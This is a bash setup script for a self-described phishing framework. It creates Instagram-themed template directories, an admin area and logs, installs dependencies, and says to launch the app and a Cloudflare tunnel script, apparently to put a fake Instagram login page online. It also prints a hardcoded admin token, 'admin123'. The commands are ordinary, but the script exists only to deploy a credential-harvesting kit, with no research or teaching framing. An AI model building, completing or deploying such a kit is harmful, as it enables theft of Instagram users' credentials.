#!/bin/bash

echo "🔧 Phishing Framework Setup"

# Create directories
mkdir -p templates/instagram templates/admin static/instagram logs

# Install dependencies
pip3 install -r requirements.txt

# Make scripts executable
chmod +x cloudflare.sh
chmod +x setup.sh

echo "✅ Setup complete!"
echo ""
echo "To start:"
echo "  1. python3 app.py"
echo "  2. ./cloudflare.sh (in another terminal)"
echo ""
echo "Admin panel: http://localhost:5000/admin"
echo "Auth token: admin123"